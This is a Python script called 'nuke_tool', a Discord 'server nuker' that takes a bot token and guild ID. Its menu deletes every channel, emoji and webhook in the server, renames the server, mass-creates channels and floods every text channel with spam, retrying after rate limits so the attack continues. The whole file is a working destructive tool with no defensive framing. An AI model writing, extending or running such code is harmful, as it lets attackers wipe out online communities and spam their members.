import requests
import time

def nuke_tool():
    token = input("Enter your BOT token: ").strip()
    guild_id = input("Enter the server (guild) ID: ").strip()
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    base_url = "https://discord.com/api/v9"

    def send_request(method, url, json=None):
        while True:
            r = method(url, headers=headers, json=json)
            if r.status_code == 429:
                retry_after = r.json().get("retry_after", 1)
                time.sleep(retry_after)
            else:
                return r

    def create_channels():
        count = int(input("Count: "))
        name = input("Name: ")
        for _ in range(count):
            send_request(requests.post, f"{base_url}/guilds/{guild_id}/channels", {"name": name, "type": 0})

    def delete_channels():
        r = requests.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers)
        for ch in r.json():
            send_request(requests.delete, f"{base_url}/channels/{ch['id']}")

    def change_server_name():
        new_name = input("New name: ")
        send_request(requests.patch, f"{base_url}/guilds/{guild_id}", {"name": new_name})

    def delete_emojis():
        r = requests.get(f"{base_url}/guilds/{guild_id}/emojis", headers=headers)
        for e in r.json():
            send_request(requests.delete, f"{base_url}/guilds/{guild_id}/emojis/{e['id']}")

    def delete_webhooks():
        r = requests.get(f"{base_url}/guilds/{guild_id}/webhooks", headers=headers)
        for w in r.json():
            send_request(requests.delete, f"{base_url}/webhooks/{w['id']}")

    def spam_all_channels():
        msg = input("Message: ")
        r = requests.get(f"{base_url}/guilds/{guild_id}/channels", headers=headers)
        for ch in r.json():
            if ch.get('type') == 0:
                send_request(requests.post, f"{base_url}/channels/{ch['id']}/messages", {"content": msg})

    def mass_create_and_spam():
        count = int(input("Count: "))
        name = input("Name: ")
        msg = input("Message: ")
        for i in range(count):
            res = send_request(requests.post, f"{base_url}/guilds/{guild_id}/channels", {"name": f"{name}-{i}", "type": 0})
            if res.status_code == 201:
                channel_id = res.json()['id']
                send_request(requests.post, f"{base_url}/channels/{channel_id}/messages", {"content": msg})

    while True:
        print("\n1-Create\n2-Delete\n3-Rename\n4-Emojis\n5-Webhooks\n6-Spam\n7-Mass Create & Spam\n0-Exit")
        choice = input("Choice: ")
        if choice == "1": create_channels()
        elif choice == "2": delete_channels()
        elif choice == "3": change_server_name()
        elif choice == "4": delete_emojis()
        elif choice == "5": delete_webhooks()
        elif choice == "6": spam_all_channels()
        elif choice == "7": mass_create_and_spam()
        elif choice == "0": break

if __name__ == "__main__":
    nuke_tool()
